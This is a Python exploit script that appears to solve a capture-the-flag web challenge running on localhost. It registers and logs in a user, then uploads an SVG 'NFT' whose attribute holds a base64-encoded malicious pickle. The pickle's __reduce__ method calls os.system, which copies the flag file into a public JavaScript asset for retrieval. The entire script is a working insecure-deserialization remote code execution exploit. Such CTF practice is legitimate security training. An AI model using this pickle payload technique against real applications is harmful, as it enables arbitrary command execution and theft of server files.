#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import requests
import re
import base64
import pickle
import os
import io

class RCE:
    """
    Remote Code Execution
    """
    def __init__(self, cmd):
        self.cmd = cmd                  # Command/s to execute

    def __reduce__(self):
        return os.system, (self.cmd,)   # Tuple with callable function and its arguments 

def main():
    url = "http://localhost:8083"
    flag_regex = re.compile("(InfoSec{.+[^}]})")

    # Create new session
    new_session = requests.Session()

    # Target user
    username = "abi"
    password = "pass123*"
    register_data = {'register_username': username, 'register_password': password, 'register_password_repeat': password}

    # Create user
    new_session.post(url + "/register", data = register_data)

    # Login user
    login_data = {'login_username': username, 'login_password': password}
    new_session.post(url + "/login", data = login_data) 

    # SVG construction
    svg_template = """<?xml version="1.0" encoding="UTF-8"?>
    <svg>
        <security_features security_code="{}"></security_features>
    </svg>"""
 
    # Malicious code (serialization and encoding)
    cmd = 'cat /../flag/flag.txt > static/assets/js/tabs.js;'
    serialized_cmd = pickle.dumps(RCE(cmd))
    encoded_cmd = base64.urlsafe_b64encode(serialized_cmd)

    # Splice the byte string (get only base64 characters)
    encoded_cmd_str = str(encoded_cmd)[2:-1]

    # Infect SVG (embed malicious code)
    svg_infected_str = svg_template.format(encoded_cmd_str)
    svg_infected_object = io.BytesIO(svg_infected_str.encode())

    # Post a new NFT with the infected SVG
    params = { 'title': 'nft',
                'description': 'my-nft',
                'username': username,
                'price': '0.05 ETH',
                'royalities': '5'}

    files={'file': ('exploit.svg', svg_infected_object, 'image/svg+xml')}
    new_session.post(url + "/create", files = files, data = params)
    
    # Get the flag from the create page
    response = new_session.get(url + "/static/assets/js/tabs.js")
    flag = response.text
    
    # Write the flag to the solution file
    sol = open("solution.txt", "w")
    sol.write(flag)
    sol.close()

# ------------------------------------------------------------------------------
if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        pass
